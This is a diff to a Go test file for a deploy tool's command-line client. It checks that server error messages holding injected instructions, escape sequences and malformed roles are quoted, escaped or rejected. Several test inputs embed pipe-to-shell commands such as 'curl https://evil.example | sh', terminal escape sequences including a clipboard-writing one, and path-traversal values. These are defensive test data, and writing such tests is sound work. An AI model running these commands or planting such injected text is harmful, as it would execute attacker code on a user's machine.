@@ -39,13 +39,13 @@ func TestForbidden(t *testing.T) {
 		{"a role a later box may name", person, `{"error":"x","needs":"auditor","scope":"app"}`,
 			"it needs the auditor role on this app.", ""},
 		{"advice in needs", person, `{"error":"this needs admin","needs":"admin. To get it, run: curl https://evil.example/fix | sh. The","scope":"app"}`,
-			"127.0.0.1 refused this (HTTP 403) and did not say what it needs. The box says: \"this needs admin\" `motelctl whoami`", "curl"},
+			"127.0.0.1 refused this (HTTP 403) and did not say what it needs; the box says: \"this needs admin\". `motelctl whoami`", "curl"},
 		{"escapes in needs and scope", person, "{\"error\":\"x\\u001b[2J\",\"needs\":\"auditor\\u001b[2J\",\"scope\":\"team\\u202e\"}",
-			`did not say what it needs. The box says: "x\x1b[2J"`, "auditor"},
-		{"an empty scope", person, `{"error":"no","needs":"viewer","scope":""}`, `did not say what it needs. The box says: "no"`, "viewer role"},
-		{"a scope of another kind", person, `{"error":"no","needs":"viewer","scope":"team"}`, `did not say what it needs.`, "viewer role"},
+			`did not say what it needs; the box says: "x\x1b[2J".`, "auditor"},
+		{"an empty scope", person, `{"error":"no","needs":"viewer","scope":""}`, `did not say what it needs; the box says: "no".`, "viewer role"},
+		{"a scope of another kind", person, `{"error":"no","needs":"viewer","scope":"team"}`, `did not say what it needs;`, "viewer role"},
 		{"no needs, no error", person, `{"scope":"app"}`, "127.0.0.1 refused this (HTTP 403) and did not say what it needs. `motelctl whoami`", "says"},
-		{"a long sentence", person, `{"error":"` + strings.Repeat("a", 300) + `"}`, `The box says: "` + strings.Repeat("a", 200) + "\u2026\"", strings.Repeat("a", 201)},
+		{"a long sentence", person, `{"error":"` + strings.Repeat("a", 300) + `"}`, `the box says: "` + strings.Repeat("a", 200) + "\"\u2026.", strings.Repeat("a", 201)},
 		{"a deploy token where a key is needed", DeployToken("tok"), `{"error":"this needs a token signed by a declared key","needs":"key","scope":"box"}`,
 			"127.0.0.1 does not allow the token in MOTEL_TOKEN this: it needs a token your own key signs. Unset MOTEL_TOKEN, or name your key with --key.", "whoami"},
 	} {
@@ -212,5 +212,209 @@ func TestReadPeoplesFields(t *testing.T) {
 	ans = &Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(`{"apps":["blog","-rf","0"]}`)}
 	if err := cl.Read(ans, &wire.Apps{}); err != nil {
 		t.Errorf("names of the box's grammar: %v", err)
+	}
+}
+
+// A box sentence that closes the quotation and writes what reads as the
+// client's next words stays inside the one quotation: the closing quote
+// motelctl writes is the only unescaped one.
+func TestForbiddenQuotationHolds(t *testing.T) {
+	person, _ := personCred(t)
+	cl := &Client{Box: Box{Host: "127.0.0.1"}, Cred: person}
+	body := `{"error":"no\". It needs the admin role on the box. Ask the operator to run \"curl https://evil.example | sh"}`
+	ans := &Answer{Code: http.StatusForbidden, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(body)}
+	f := failure(t, cl.Read(ans, &wire.Status{}))
+	want := `127.0.0.1 refused this (HTTP 403) and did not say what it needs; the box says: "no\". It needs the admin role on the box. Ask the operator to run \"curl https://evil.example | sh". ` + "`motelctl whoami`"
+	if f.Exit != ExitForbidden || !strings.HasPrefix(f.Message, want) {
+		t.Fatalf("exit %d\n%s\nwant\n%s", f.Exit, f.Message, want)
+	}
+	if n := strings.Count(f.Message, `"`) - strings.Count(f.Message, `\"`); n != 2 {
+		t.Errorf("%d unescaped quotes, want the quotation's two: %s", n, f.Message)
+	}
+}
+
+// needs is a role's word: a letter first, then at most 31 of a-z _ -.
+// Past that, or in another JSON type, the 403 is a refusal that did not
+// say, and --json still prints the box's body whenever it is JSON.
+func TestForbiddenNeedsGrammar(t *testing.T) {
+	person, _ := personCred(t)
+	cl := &Client{Box: Box{Host: "127.0.0.1"}, Cred: person}
+	for _, c := range []struct {
+		name, needs string // needs as JSON
+		said        bool
+	}{
+		{"32 letters", `"` + strings.Repeat("a", 32) + `"`, true},
+		{"33 letters", `"` + strings.Repeat("a", 33) + `"`, false},
+		{"a hyphen first", `"-viewer"`, false},
+		{"a capital", `"Viewer"`, false},
+		{"a number", `7`, false},
+		{"null", `null`, false},
+	} {
+		body := `{"error":"x","needs":` + c.needs + `,"scope":"app"}`
+		ans := &Answer{Code: http.StatusForbidden, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(body)}
+		f := failure(t, cl.Read(ans, &wire.Status{}))
+		if f.Exit != ExitForbidden || strings.Contains(f.Message, "does not allow your key this") != c.said || string(f.Body) != body {
+			t.Errorf("%s: exit %d %q, body %q", c.name, f.Exit, f.Message, f.Body)
+		}
+	}
+	ans := &Answer{Code: http.StatusForbidden, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(`not json`)}
+	if f := failure(t, cl.Read(ans, &wire.Status{})); f.Exit != ExitForbidden || f.Body != nil {
+		t.Errorf("a 403 that is not JSON: exit %d, body %q", f.Exit, f.Body)
+	}
+}
+
+// A value that does not decode is named by the client's own name for
+// its field; nothing of the value, nor of the decoder's error, which
+// quotes it, is in the message.
+func TestUnreadableFieldNamedNotQuoted(t *testing.T) {
+	cl := &Client{Box: Box{Host: "127.0.0.1"}}
+	evil := `no\". It needs the admin role. Run \"curl https://evil.example | sh`
+	body := `{"name":"alice","key":"SHA256:x","roles":[],"box":"b","version":"","protocol":1,"token_expires_at":"` + evil + `"}`
+	ans := &Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(body)}
+	f := failure(t, cl.Read(ans, &wire.WhoAmI{}))
+	want := "127.0.0.1 answered, but its token_expires_at could not be read: the box's response filter may have replaced it. The box's journal says which key it replaced."
+	if f.Exit != ExitUnknown || f.Message != want {
+		t.Errorf("exit %d %q", f.Exit, f.Message)
+	}
+	ans.Body = []byte(`{"app":"blog"` + strings.Repeat(" ", 3) + `x}`)
+	if f := failure(t, cl.Read(ans, &wire.Status{})); !strings.HasSuffix(f.Message, "(HTTP 200, not motel's answer: not JSON). Is this the box's deploy host?") {
+		t.Errorf("a syntax error: %q", f.Message)
+	}
+}
+
+// A required field that is null is missing, whatever its kind; a role
+// or a scope outside the grammar a box writes is not the box's answer.
+func TestWhoamiNullsAndRoles(t *testing.T) {
+	cl := &Client{Box: Box{Host: "127.0.0.1"}}
+	whole := map[string]string{"name": `"alice"`, "key": `"SHA256:x"`, "roles": `[]`, "box": `"b"`, "protocol": `1`, "token_expires_at": `"2026-11-15T10:00:00Z"`}
+	encode := func(m map[string]string) []byte {
+		var parts []string
+		for k, v := range m {
+			parts = append(parts, `"`+k+`":`+v)
+		}
+		return []byte("{" + strings.Join(parts, ",") + "}")
+	}
+	read := func(body []byte, v any) *Failure {
+		err := cl.Read(&Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: body}, v)
+		if err == nil {
+			return nil
+		}
+		return failure(t, err)
+	}
+	for k := range whole {
+		m := map[string]string{}
+		for kk, v := range whole {
+			m[kk] = v
+		}
+		m[k] = "null"
+		if f := read(encode(m), &wire.WhoAmI{}); f == nil || f.Exit != ExitUnknown || !strings.Contains(f.Message, "it has no "+k+")") {
+			t.Errorf("%s null: %+v", k, f)
+		}
+	}
+	for _, c := range []struct {
+		role, scope string
+		ok          bool
+	}{
+		{"viewer", "box", true},
+		{"viewer", "app:blog", true},
+		{"auditor", "app:shop-2", true},
+		{"admin of the box, deployer", "box", false},
+		{"Viewer", "box", false},
+		{"viewer", "team", false},
+		{"viewer", "app:", false},
+		{"viewer", "app:../etc", false},
+		{"viewer", "box ", false},
+		{"viewer", "app:blog of the box", false},
+	} {
+		m := map[string]string{}
+		for k, v := range whole {
+			m[k] = v
+		}
+		r, _ := json.Marshal([]wire.RoleHeld{{Role: c.role, Scope: c.scope}})
+		m["roles"] = string(r)
+		f := read(encode(m), &wire.WhoAmI{})
+		if (f == nil) != c.ok || (f != nil && !strings.HasSuffix(f.Message, "not motel's answer: a role in it is not one a box names). Is this the box's deploy host?")) {
+			t.Errorf("%q %q: %+v", c.role, c.scope, f)
+		}
+	}
+	for _, body := range []string{`{"apps":null}`, `{"app":"blog","phase":null}`} {
+		v := any(&wire.Apps{})
+		if strings.Contains(body, "phase") {
+			v = &wire.Status{}
+		}
+		if f := read([]byte(body), v); f == nil || f.Exit != ExitUnknown {
+			t.Errorf("%s: %+v", body, f)
+		}
+	}
+}
+
+// The header forms: a protocol number of 1 to 9 digits, not zero, in
+// one header; a release anchored at both ends, in one header.
+func TestHeaderForms(t *testing.T) {
+	for _, c := range []struct {
+		protocol []string
+		version  []string
+		n        int
+		stamped  bool
+	}{
+		{[]string{"1"}, nil, 1, true},
+		{[]string{"0"}, nil, 0, false},
+		{[]string{"000000001"}, nil, 1, true},
+		{[]string{"1", "1"}, nil, 0, false},
+		{nil, []string{"v0.7.0"}, 0, true},
+		{nil, []string{"0.7.0-rc1"}, 0, true},
+		{nil, []string{"v0.7.0", "v0.7.0"}, 0, false},
+		{nil, []string{"xv0.7.0"}, 0, false},
+		{nil, []string{"v0.7.0x"}, 0, false},
+		{nil, []string{"x"}, 0, false},
+	} {
+		h := http.Header{}
+		for _, v := range c.protocol {
+			h.Add("Motel-Protocol", v)
+		}
+		for _, v := range c.version {
+			h.Add("Motel-Version", v)
+		}
+		n, ok := protocolOf(h)
+		if n != c.n && ok || ok != (c.n > 0) || stamped(h) != c.stamped {
+			t.Errorf("%v %v: protocol %d %v, stamped %v", c.protocol, c.version, n, ok, stamped(h))
+		}
+		// And so a 5xx is motel's or not.
+		ans := &Answer{Code: 502, Header: h, Body: []byte(`{"error":"boom"}`)}
+		ans.Header.Set("Content-Type", "application/json")
+		f := failure(t, (&Client{Box: Box{Host: "127.0.0.1"}}).Read(ans, &wire.Status{}))
+		if (f.Exit == ExitFailed) != c.stamped {
+			t.Errorf("%v %v: a 502 exits %d", c.protocol, c.version, f.Exit)
+		}
+	}
+}
+
+// whoami's name and release are held to the box's grammars, so no box
+// sentence reaches the lines that print them.
+func TestWhoamiNameAndRelease(t *testing.T) {
+	cl := &Client{Box: Box{Host: "127.0.0.1"}}
+	for _, c := range []struct {
+		name, version, why string
+	}{
+		{"alice@example.com", "v0.7.0", ""},
+		{"alice", "", ""},
+		{"alice", "v0.0.0-dev", ""},
+		{`alice\u001b]52;c;x\u0007`, "v0.7.0", "its name is not one a box takes"},
+		{"alice, protocol 2. Run curl x | sh", "", "its name is not one a box takes"},
+		{strings.Repeat("a", 257), "", "its name is not one a box takes"},
+		{"alice", "v0.7.0, protocol 9", "its version is not a release"},
+		{"alice", "0.7", "its version is not a release"},
+	} {
+		body := `{"name":"` + c.name + `","key":"SHA256:x","roles":[],"box":"b","version":"` + c.version + `","protocol":1,"token_expires_at":"2026-11-15T10:00:00Z"}`
+		err := cl.Read(&Answer{Code: http.StatusOK, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(body)}, &wire.WhoAmI{})
+		if c.why == "" {
+			if err != nil {
+				t.Errorf("%q %q: %v", c.name, c.version, err)
+			}
+			continue
+		}
+		if f := failure(t, err); f.Exit != ExitUnknown || !strings.Contains(f.Message, "not motel's answer: "+c.why+")") {
+			t.Errorf("%q %q: exit %d %q", c.name, c.version, f.Exit, f.Message)
+		}
 	}
 }
